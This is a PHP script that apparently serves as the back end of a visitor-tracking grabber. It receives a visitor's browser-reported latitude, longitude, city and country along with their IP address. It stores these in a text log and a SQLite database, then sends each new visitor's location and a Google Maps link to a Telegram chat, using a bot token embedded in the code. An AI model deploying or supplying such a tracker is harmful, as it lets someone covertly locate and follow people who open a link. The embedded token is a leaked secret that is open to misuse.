<?php
// Collect visitor info and log to SQLite + TXT + Telegram

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

$data = json_decode(file_get_contents("php://input"), true);

$ip = get_client_ip();
$lat = $data['latitude'] ?? 'N/A';
$lon = $data['longitude'] ?? 'N/A';
$city = $data['city'] ?? 'N/A';
$country = $data['country'] ?? 'N/A';
$timestamp = date("Y-m-d H:i:s");
$mapLink = "https://www.google.com/maps?q=$lat,$lon";

// Text log
$log = "IP: $ip | Lat: $lat | Lon: $lon | City: $city | Country: $country | Time: $timestamp\n";
file_put_contents("log.txt", $log, FILE_APPEND);

// SQLite
$db = new SQLite3('log.db');
$db->exec("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY, ip TEXT, latitude TEXT, longitude TEXT, city TEXT, country TEXT, timestamp TEXT)");
$stmt = $db->prepare("INSERT INTO logs (ip, latitude, longitude, city, country, timestamp) VALUES (?, ?, ?, ?, ?, ?)");
$stmt->bindValue(1, $ip);
$stmt->bindValue(2, $lat);
$stmt->bindValue(3, $lon);
$stmt->bindValue(4, $city);
$stmt->bindValue(5, $country);
$stmt->bindValue(6, $timestamp);
$stmt->execute();

// Telegram Notify
$botToken = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
$chatId = "6602027873";
$msg = urlencode("New visitor:\nIP: $ip\nLocation: $city, $country\nMap: $mapLink");
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");

echo json_encode(["status" => "logged"]);
?>
